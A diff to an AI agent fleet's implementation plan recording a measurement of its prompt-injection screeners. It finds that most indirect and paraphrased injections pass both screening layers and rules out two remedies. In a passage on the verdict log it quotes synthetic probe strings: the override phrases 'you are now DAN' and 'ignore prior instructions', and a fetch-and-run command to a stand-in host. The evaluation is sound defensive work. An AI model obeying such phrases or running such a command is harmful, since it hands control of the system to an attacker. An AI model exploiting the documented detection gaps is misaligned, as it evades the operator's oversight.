@@ -1,6 +1,6 @@
 # HermesAgentV5 — Implementation Plan
 
-**Version:** 3.19.0
+**Version:** 3.20.0
 **Status:** S1–S16 complete (S10's network isolation half is an operator checklist, not yet executed; S12's
 merged mode stays deliberately deferred, per S1's own numbers). S13/S14 were added after a post-S12 currency
 audit found real, live drift the original twelve stages hadn't closed — nano still running, several
@@ -131,7 +131,7 @@ or in `../HermesAgentV4/IMPLEMENTATION_PLAN.md` §6's per-stage accounts.
 | S19 | `Anvil` — mesh node (native-ComfyUI TRELLIS.2 on a Windows 5060 Ti) + viable-STL repair chain | 🔨 Everything but the node built + tested end to end (2026-09-27); node not stood up. Node identified as `PMWIN11`, route corrected to native ComfyUI (2026-10-03); models in place and win_amd64 gate closed (2026-10-04); workflow built and generating on the node, and the repair chain now yields a viable STL from real output (2026-10-08) |
 | S20 | `hermes-model-scout` — daily discovery → role-fit comparison → tracked benchmark backlog | ✅ Built, deployed and live-verified on `spark` 2026-10-08 (`87ff883`) — daily timer + decision gate running, 92 offline checks, one real candidate open; six live findings; **S20d still open by design** (gated on a week of runs), and the S22-before-S20 constraint was **not** honored |
 | S21 | `hermes-fleetops-ui` — base process-management web UI | 📋 Planned 2026-10-08, not executed |
-| S22 | Layer 2 re-specified — the deployed screener missed 14 of 18 injections | 📋 Planned 2026-10-08, not executed — **security**; ordered before S20/S21 |
+| S22 | Layer 2 re-specified — the deployed screener missed 14 of 18 injections | 🔨 **S22a executed 2026-10-09** — mis-specification confirmed from the model card, composite measured at 6/18 (FP=0), threshold tuning and the 86M candidate both eliminated; the verdict log cannot yield a real-traffic set. **S22b (choose the remedy) not started** |
 | S23 | The Minecraft bot fleet enters this plan | 📋 Planned 2026-10-08, not executed (the fleet itself is live since 2026-09-13) |
 | S24 | Currency audit — what S13/S14 would find today | 📋 Planned 2026-10-08, not executed — nine findings, one questions S16's recall number |
 | S25 | `hermes-x-reader` — X/Twitter posts into the existing RAG/news-digest pipeline, via self-hosted RSS-Bridge | ⛔ **Deferred 2026-10-08 — its keyless premise is measured false.** Operator go-ahead was given and the stage was then stopped before any build: RSS-Bridge's timeline call needs a real X account's OAuth tokens, pasted into vendored PHP. Nothing was built, nothing installed |
@@ -2851,15 +2851,123 @@ Three things the bake-off's number cannot carry on its own, none of which need a
    the paraphrase cases Layer 2 missed. What gets through **both** layers has never been measured — only
    each layer separately. Measure Layer 1 against the same 18, then the pair.
 
+#### S22a — executed 2026-10-09: all three items measured, and two remedies eliminated
+
+**Measurement only, as designed — nothing was swapped, retuned or deployed.** `tools/hermes-guard-eval.py`
+is the repeatable form of it: it imports `GUARD_CASES` from `hermes-bakeoff-typesafe.py` rather than
+copying the cases, calls the **live** Layer-2 service rather than reloading the checkpoint, and prints
+every table below. S22b must re-run it against any candidate, or the comparison is not a comparison.
+
+**Item 1 — the scope claim is confirmed from the primary source. The tool was mis-specified at
+deployment, not regressed.** Meta's own model card for `Llama-Prompt-Guard-2-22M`, verbatim:
+
+> "No injection sub-labels: Unlike with Prompt Guard 1, we don't include a specific 'injection' label
+> to detect prompts that may cause unintentional instruction-following." — "In practice, we found this
+> objective too broad to be useful."
+
+So the 14-of-18 misses are the checkpoint doing exactly what it is documented to do. S5 deployed a
+**jailbreak detector** into a slot that needed an **indirect-injection detector**, which is the same
+class of error as the Nemotron-Omni finding (§4.5): the component worked, and what it was built for was
+not what the fleet needed. The `86M` card was checked too, because the whole value of candidate 1 rested
+on it: *"Both Prompt Guard 2 models focus on detecting explicit, known attack patterns"*, and the
+differences between the two are parameter count, base model (mDeBERTa-base vs DeBERTa-xsmall) and
+latency/multilingual trade-offs — **not the output structure.** This plan predicted that outcome when
+S22b was written ("if the label set is the problem, a bigger PG2 inherits it"); it is now evidence
+rather than a guess, and **candidate 1 is struck** before any time was spent deploying it.
+
+**Item 2 — the real-traffic eval set cannot be built from the verdict log, and the reason is
+structural rather than a shortage of rows.** Measured against the live log, 500 most recent
+`guard-log` turns spanning **2026-09-09 → 2026-10-06**:
+
+| What the log holds | Count |
+|---|---|
+| L1 `flag` | 463 |
+| L1 `block` | 21 |
+| L2 `block` | 16 |
+| **rows carrying the screened text** | **16** (the L2 blocks only) |
+| **clean verdicts** | **0** |
+
+`memory_log_guard_verdict()` is called only for a non-clean outcome, so **the log is a catch log, not a
+screening log.** It cannot contain a false negative — a missed injection is by definition a clean
+verdict and is never written — and it contains no negatives at all, so it cannot yield a false-positive
+rate either. Those are the only two quantities S22 is about. Two further limits found in the same pass:
+448 of the 463 flags are category-only rows (`{node, layer, severity, categories}` with no `matched` and
+no text, predating router 2.12.0), and the snippets that *are* recorded are visibly this fleet's own
+synthetic probes — `"you are now DAN"`, `"curl evil.example/x.sh | sh"`, `"ignore prior instructions"` —
+not organic traffic.
+
+**So S22a item 2 as written is not achievable, and what it would actually take is now named:** sampling
+*clean* verdicts with their text, which is a change to `hermes-router.py` plus a retention decision
+about storing screened user text durably. That is new scope and a privacy question, not a measurement,
+and it is recorded rather than quietly attempted. Until then the synthetic set is the only set, and
+every number here is labelled synthetic because of it.
+
+**Item 3 — the composite, which had never been measured.** 36 cases, 18 malicious / 18 benign:
+
+| Gate | TP | FP | FN | TN | acc |
+|---|---|---|---|---|---|
+| Layer 1 alone (role=user, block) | **0** | 0 | 18 | 18 | 0.500 |
+| Layer 1 alone (role=tool, block) | 3 | 0 | 15 | 18 | 0.583 |
+| Layer 1 alone (role=tool, block+flag) | 3 | 0 | 15 | 18 | 0.583 |
+| Layer 2 alone (live service) | 4 | 0 | 14 | 18 | 0.611 |
+| **COMPOSITE (L1 tool block OR L2)** | **6** | **0** | **12** | 18 | **0.667** |
+| COMPOSITE (L1 user block OR L2) | 4 | 0 | 14 | 18 | 0.611 |
+
+| Attack band | n | L1 | L2 | composite |
+|---|---|---|---|---|
+| direct | 6 | 2 | 3 | 4 |
+| **indirect** | 6 | 1 | **0** | **1** |
+| **paraphrased** | 6 | 0 | 1 | **1** |
+
+Four things in that, in descending order of how much they should change someone's mind:
+
+1. **Twelve of eighteen attacks pass both layers.** The composite catches a third. The two bands that
+   matter for anything RAG-fed — planted instructions and paraphrase — run at **1 of 6 each**.
+2. **Layer 1 blocks nothing at `role=user`.** Only `role_spoof` and `unicode_smuggling` are
+   always-block, and none of these 18 attacks use either, so for an ordinary chat turn **Layer 2 is the
+   only gate that exists** and it catches 4 of 18. The composite's 6 is a `role=tool` number.
+3. **Layer 1 never flags what it does not block on this set** (block+flag == block == 3), so 15 of 18
+   attacks produce no Layer-1 signal at all — not even a logged flag.
+4. **The layers are genuinely complementary** (6 > both 3 and 4), so Layer 1 is not redundant and must
+   not be dropped when Layer 2 is replaced. Zero false positives at every gate, including the deliberate
+   hard negatives — the screening is precise and badly under-sensitive, which is the opposite of the
+   failure mode usually feared.
+
+**Threshold tuning is eliminated, with numbers rather than by argument.** Recovering P(malicious) from
+the service's argmax probability (exact for a two-class softmax) shows the distributions overlapping
+almost entirely below **0.063** — fourteen of the eighteen attacks score inside the benign range:
+
+```
+P(malicious), malicious: 0.9979 0.9953 0.9941 0.6123 | 0.0629 0.0462 0.0231 0.0200 0.0107 … 0.0013
+P(malicious), benign:    0.0372 0.0077 0.0062 0.0047 0.0047 0.0042 … 0.0008
+```
+
+The sweep: the **best accuracy achievable at any cutoff is 0.722**, at `t=0.01` — a threshold fifty times
+below the deployed 0.5, still catching only 9 of 18, and already taking a false positive. Reaching 17 of
+18 costs 9 false positives out of 18 benign cases, i.e. blocking half of legitimate traffic. There is no
+operating point worth having, which is what distinguishes a mis-specified model from a mis-tuned one.
+
+**Consequence for S22b, which is now a shorter list.** Candidate 1 (`86M`) is struck on the model card.
+Threshold tuning is struck on the sweep. That leaves the measured `dispatch` LLM arm (TP 15 / FP 1 /
+FN 0, 0.970, 233 ms) as the leading option **by elimination rather than by preference** — with its
+structural objection unchanged and still the thing to solve, since a screener running on the model being
+protected has no independent failure mode. Candidate 3 (a small stock instruct model with a narrow
+classification prompt) is now the only untested alternative to it and should be measured in the same run,
+because "the LLM is better than a classifier that was never built for this" is a weak claim to act on
+alone.
+
 #### S22b — Choose the remedy against the two standing constraints
 
 Constraints, from target §12.1 and the bake-off's own wording: the control plane stays **stock weights**,
 and Layer 2 has a per-call latency budget (85 ms incumbent, 233 ms for the measured LLM arm). Candidates
 in test order — this is a list to measure, not a decision:
 
-1. **`Llama-Prompt-Guard-2-86M`** — same family, stock, same architecture class, and the only option that
-   costs nothing architecturally. Must be measured rather than assumed better: if the label set is the
-   problem, a bigger PG2 inherits it. S22a's finding 1 predicts this outcome before it is spent.
+1. ~~**`Llama-Prompt-Guard-2-86M`** — same family, stock, same architecture class, and the only option
+   that costs nothing architecturally.~~ **STRUCK 2026-10-09 on S22a item 1.** Its own model card states
+   both PG2 models omit PG1's injection label and differ only in parameter count, base model and
+   latency/multilingual trade-offs — "not their classification output structure." It inherits the exact
+   blind spot, so there is nothing to measure. This list predicted that ("if the label set is the
+   problem, a bigger PG2 inherits it"), which is why it was checked before being deployed.
 2. **The `dispatch` LLM as Layer 2** — the measured TP 15 / FN 0 / 0.970 arm, stock weights, already
    resident, no new checkpoint. The structural objection gets written down rather than waved at: a
    screener running on the model being protected has no independent failure mode, and the one FP shows it
@@ -3766,3 +3874,4 @@ reference chain across two retired repos settles it in favour of forking.
 | 3.17.0 | 2026-10-09 | **S26's exit gate is met** — the first of the three sibling stages (S20, S25, S26) to produce the evidence its own risk list asked for; S20's and S25's equivalents remain open and unchanged. Risk 4 wanted a `hermes-news-digest` line citing one of these feeds that a human confirms was worth surfacing, and there is one: a CISA advisory published **2026-10-08** (Chinese government-linked actors combining automated and hands-on tooling), fetched by `hermes-feed-reader` the same evening, chunked and embedded into the existing RAG store, retrieved by an operator-written topic, and summarized with its real MITRE technique ids (`T1595.002`, `T1189`, `T1059.001`) intact and cited back to its own `cisa.gov` URL. **Confirmed worth surfacing by the operator, 2026-10-09.** Recorded with its limits rather than as a win: the gate establishes that the chain works end to end on real content, with nothing staged and no step simulated except the final SMTP send; it establishes **no rate**, since the same run returned `nothing new` for six of eight topics — the pipeline is proven and its productivity is unmeasured. One wording caveat kept visible: the gate says "email" and the evidence came from a `--dry-run`, which composes the body and stops before SMTP, so this is recorded as met on the content rather than the transport — the first real send is the 07:10 timer run on 2026-10-09, against the same cursor (97277) and the same eight topics. Risk 4 is struck through rather than deleted, since its wording is what the gate was judged against. Minor bump — a gate closed and recorded, nothing prior reversed. |
 | 3.18.0 | 2026-10-09 | **Eight first-party privacy/standards feeds added to S26; the two silent topics are still silent, and the cause is measured to be the digest's relevance threshold rather than the source list.** Research done to S26's own bar — every candidate probed with `urllib` before being written down, and the failures recorded in `feeds.yaml` itself so nobody re-researches them: **FTC**'s feeds exist (its own `/stay-connected/rss` lists them) but are unreachable from `spark` (403 to this reader's UA, 404 to a full browser header set); **ICO, EDPS, ENISA and IAPP** declare no feed at all, with every candidate path 404ing; **general NIST News** works but was skipped deliberately as all-of-NIST noise; and **NCSC News/Reports** were skipped as strict subsets of NCSC's "all" feed, which would have triple-ingested each advisory. Added: EDPB, CNIL (flagged in-file as French-language), NIST CSRC drafts, IETF RFC Editor, W3C News, NIST Cybersecurity Insights, NCSC UK, Cloud Security Alliance — 22 feeds total, with two new categories (`privacy`, `standards`) and the reader's validator and test suite extended to match (67 checks). Ingested 105 entries / 113 chunks, 0 failures. **The finding that matters more than the feeds:** both topics still return nothing, because the right documents are retrieved and then filtered — EDPB's Irish DPC item at 0.917, its CNIL health-breach item at 0.901, NIST SP 800-78-6 at 0.893, SP 800-73-6 at 0.897, all above the 0.85 `RELEVANCE_THRESHOLD` whose own comment calls it empirical "in this corpus, with this embedding model" — a corpus of podcast transcripts and fleet docs, i.e. long chunks. A short feed entry scores systematically further than a long transcript passage on the same subject, the same effect S26's finding 4 measured from the other side, and the only two topics that fire are the ones whose sources publish long bodies (CISA advisories, arXiv abstracts). Raising the cutoff does not separate signal: for short texts the distances cluster 0.87–0.99 regardless of relevance, so a threshold admitting EDPB at 0.917 also admits an unrelated Hugging Face post at 0.918. The real options — enrich chunks by fetching the linked article body (new scope for S26) or make the threshold length/corpus-aware (S27's call, since it owns that file) — are recorded, not chosen. Minor bump — sources added and a constraint measured; nothing prior reversed. |
 | 3.19.0 | 2026-10-09 | **S27e executed — the digest's relevance gate is now length-invariant, and topics producing news went from 2 of 8 to 6 of 8 on identical content.** The only built part of S27; S27a-d stay planned and `hermes-news-digest.py` is otherwise untouched. The old `RELEVANCE_THRESHOLD = 0.85` is documented in its own comment as empirical "in this corpus, with this embedding model" — podcast transcripts and fleet docs, i.e. long chunks — and short feed entries that correctly matched scored 0.893-0.917, outside it. Raising it was measured not to work: for short texts distances cluster 0.87-0.99 regardless of relevance, so a cutoff admitting EDPB's Irish-DPC item at 0.917 also admits an unrelated Hugging Face post at 0.918. Gating moved onto the cross-encoder `rerank_score` that S16b already deployed and `rag.search()` already attaches, which reads the query/passage pair and is not length-scaled — it separates that same pair **0.9239 against 0.0036**. Two measured constants: `RERANK_FLOOR = 0.02`, above the 0.0112 ceiling of three deliberately irrelevant control queries, so a topic below it is quiet whatever its pool looks like; and `RERANK_RATIO = 0.25`, relative because the absolute scale is not comparable across topics (direct-answer matches score 0.93-0.99, topically-adjacent-but-useful ones 0.06-0.24, and no single cutoff holds both). Distance survives as the fallback only, unchanged, for an unreachable reranker or a single-candidate pool — not retuned on purpose, so a cross-encoder outage makes short-entry sources quiet rather than loud, this file's own stated bias; the gate reports which mode ran and the digest logs it. Live result: the previously-silent privacy topic now surfaces the Irish DPC's **EUR 403,000,000 fine against Google** over location data, three further topics (exploited vulnerabilities, AI alignment research, AI governance) that the old cutoff had been filtering now fire, the AI-eval topic got slightly tighter (a 'Gemini 4 Argon' passage the old gate admitted at distance 0.837 scores 0.0059 and is dropped), and the standards topic stays quiet because the cross-encoder genuinely rates bare NIST SP titles weak — a judgement about content, not a threshold artifact. 27 offline checks in `infra/hermes-news-digest/tests/test_relevance_gate.py` pin every one of those cases against the real observed score sets. **It also exposed the next bottleneck, which is evidence for S27c/d rather than a defect here:** with more passages reaching the summarizer, one line per topic picks among them arbitrarily — the privacy line summarized the weaker of its two passages (an EDPB stakeholder event at 0.4896) and ignored the EUR 403M fine (0.9289) while citing both. S27c/d's up-to-50-highlights-per-topic storage is the fix, and now has a live example rather than an argument. Minor bump — one substage executed, nothing prior reversed. |
+| 3.20.0 | 2026-10-09 | **S22a executed — measurement only, and it eliminated two of the four remedies before any was deployed.** `tools/hermes-guard-eval.py` is the repeatable form (imports `GUARD_CASES` from the bake-off harness rather than copying them, calls the live Layer-2 service rather than reloading the checkpoint). **Item 1, from the primary source:** PG2's own model card says "No injection sub-labels: Unlike with Prompt Guard 1, we don't include a specific 'injection' label to detect prompts that may cause unintentional instruction-following" — "we found this objective too broad to be useful." So the 14-of-18 is the checkpoint doing what it is documented to do, and S5 deployed a **jailbreak detector** into a slot needing an **indirect-injection detector** — mis-specified at deployment, not regressed, the same class as the Nemotron-Omni finding. The 86M card was checked for the same reason and says both PG2 models differ in parameter count, base model and latency/multilingual trade-offs, "not their classification output structure", so **S22b candidate 1 is struck** before deployment — an outcome this plan predicted in writing. **Item 2: the real-traffic eval set cannot be built from the verdict log, structurally.** 500 most recent `guard-log` turns (2026-09-09→2026-10-06) hold 463 L1 flags, 21 L1 blocks, 16 L2 blocks, **16 rows with the screened text, and zero clean verdicts** — `memory_log_guard_verdict()` only fires on a non-clean outcome, so the log is a *catch* log and can never contain a false negative, the only quantity S22 cares about. 448 of the flags are category-only rows predating router 2.12.0, and the identifiable snippets are this fleet's own synthetic probes rather than organic traffic. What a real set would require is now named rather than attempted: sampling clean verdicts with their text, which is a router change plus a retention decision about durably storing screened user text. **Item 3, the composite, never measured until now:** L1 alone at role=user TP **0**/18; L1 at role=tool 3/18 (and it never flags what it does not block, so 15 of 18 attacks raise no L1 signal at all); L2 alone 4/18; **composite 6/18 with FP=0**. By band — direct 4/6, **indirect 1/6, paraphrased 1/6**, so the two bands that matter for anything RAG-fed run at a sixth. Layer 1 blocks **nothing** at role=user because only `role_spoof`/`unicode_smuggling` are always-block and none of these attacks use either, which means for an ordinary chat turn Layer 2 is the only gate in existence. The layers are genuinely complementary (6 > both 3 and 4), so Layer 1 must not be dropped when Layer 2 is replaced. Zero false positives at every gate including the deliberate hard negatives: the screening is precise and badly under-sensitive, the opposite of the usual fear. **Threshold tuning is eliminated with numbers:** recovering P(malicious) shows the malicious and benign distributions overlapping almost entirely below 0.063 (fourteen of eighteen attacks score inside the benign range), and the best accuracy at any cutoff is 0.722 at t=0.01 — fifty times below the deployed 0.5, still only 9 of 18 caught, already one false positive; reaching 17 of 18 costs 9 false positives out of 18 benign. **S22b is now a shorter list**: with the 86M and threshold tuning both struck, the measured `dispatch` LLM arm (TP 15 / FP 1 / FN 0, 0.970, 233 ms) leads **by elimination rather than preference**, its structural objection unchanged, and candidate 3 (a small stock instruct model with a narrow classification prompt) is the only untested alternative and should be measured in the same run. Minor bump — one substage executed, two candidates eliminated on evidence, nothing prior reversed. |
